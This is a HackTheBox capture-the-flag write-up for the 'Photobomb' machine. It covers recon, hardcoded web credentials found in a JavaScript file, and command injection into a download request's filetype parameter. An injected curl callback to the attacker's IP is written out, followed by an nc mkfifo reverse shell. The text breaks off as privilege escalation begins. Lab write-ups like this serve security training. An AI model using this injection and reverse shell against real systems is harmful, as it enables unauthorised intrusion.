## Photobomb - HackTheBox

<img width="416" alt="image" src="https://user-images.githubusercontent.com/114961392/201578781-8f2568c0-e6dd-4671-b374-ac5328570c05.png">

Machine: Photobomb  
Operating System: Linux  
Release Date: 08/10/2022  
Difficulty: Easy  

Photobomb is new machine however did not take too long to compromise. It is a website which requires authorization, then you can download a selected photo.  
I compromised the system by injecting code after intercepting the request when you download a picture. Privilege Escalation was achieved by exploiting the /opt/cleanup.sh file.  
Vulnerability: Remote Code Execution  

### Reconnaissance

First, let's scan all ports with nmap.
nmap -p- --min-rate=10000 10.10.11.182  

<img width="328" alt="image" src="https://user-images.githubusercontent.com/114961392/201580231-ed38a900-9113-40ee-be61-321c646102c2.png">

Only 2 ports are open, port 22 (SSH) and port 80 (HTTP). Let's do a service, script, and vulnerability scan.  
nmap -p22,80 -sC -sV --script vuln 10.10.11.182  

<img width="697" alt="image" src="https://user-images.githubusercontent.com/114961392/201580386-a205a2db-4981-4854-bd43-a4985bd6ac06.png">

This comes up with a few vulnerabilities however they do not look interesting so I will move on. Let's have a look at the website and source code.  

<img width="467" alt="image" src="https://user-images.githubusercontent.com/114961392/201580607-03cd42a5-00d0-4676-be61-bf4d2b62338b.png">
<img width="583" alt="image" src="https://user-images.githubusercontent.com/114961392/201580709-0451d1d7-aa80-4954-acae-b9f36aa1b6d5.png">

Before we navigate to the website, photobomb.htb will need to be added to the /etc/hosts file so it resolves the domain. The website only has 1 link to the /printer directory which requires authorization. I tried a few basic user/password combinations however no luck.  
In the source code there is link to a script called "photobomb.js", this looks interesting. Looking at the script we can see it has hardcoded credentials.  
Username: pH0t0  
Password: b0Mb!  

<img width="506" alt="image" src="https://user-images.githubusercontent.com/114961392/201581319-926e79ca-f84d-4ddc-98e2-d3b4ba66671f.png">

Before we continue, let's quickly check dirsearch and FFUF for any hidden directories.  

<img width="469" alt="image" src="https://user-images.githubusercontent.com/114961392/201582018-96cdc066-a37f-4490-9fd2-f9397dc8f67c.png">

Only the /printer directory comes up, which we already know. Now let's check FFUF.  

<img width="725" alt="image" src="https://user-images.githubusercontent.com/114961392/201582248-b78a11ce-d0df-4d6d-8b01-c1d907a3b379.png">

Still nothing interesting, let's move on.  
Once the hardcoded credentials have been entered, we can access the site. The website has several pictures which you can choose to download.  
Let's intercept the download request with Burp Suite to see if we can inject.  
Here is the original request:  

<img width="302" alt="image" src="https://user-images.githubusercontent.com/114961392/201583236-ccb61e24-1263-4ff4-9d32-6823093ec5f5.png">

To test if there is an injection vulnerability, I will set up a python web server on my local machine and try connecting through the request.  
In the request, after "filetype=jpg", I will add ";curl 10.10.14.7/test", send the request and see if anything comes up on the server (make sure to URL encode the injection).  

<img width="300" alt="image" src="https://user-images.githubusercontent.com/114961392/201584095-c5a22f4c-acbe-4fa8-9f4a-e1836d23c0b1.png">

Success! As we can see, it sent a request to my server. This is proof of concept that there is an injection vulnerability.  

<img width="372" alt="image" src="https://user-images.githubusercontent.com/114961392/201584361-d02f320a-1a64-444c-afbb-6d1bfc84a45f.png">

## Exploitation

Now let's craft a reverse shell to connect back to my local machine using [revshells.com](https://www.revshells.com/). I will use the "nc mkfifo" option with "sh".  
Let's URL encode that and inject into the request after setting up a netcat listener.    

<img width="296" alt="image" src="https://user-images.githubusercontent.com/114961392/201584966-32240a26-64f4-471f-983d-e7c15a4be6fb.png">

WOOSHKAH! We have a reverse shell. I will use the usual terminal upgrade technique to get a more stable shell.

<img width="306" alt="image" src="https://user-images.githubusercontent.com/114961392/201585184-18cd1410-918a-4f56-b8ef-d54ef1864df5.png">

Now that we are in, we can navigate to the user flag.  

<img width="169" alt="image" src="https://user-images.githubusercontent.com/114961392/201585584-a9462dab-c112-4db1-990a-7bcc76972105.png">

## Privilege Escalation

By using the "sudo -l" technique, we can see that we can run /opt/cleanup.sh from root.  
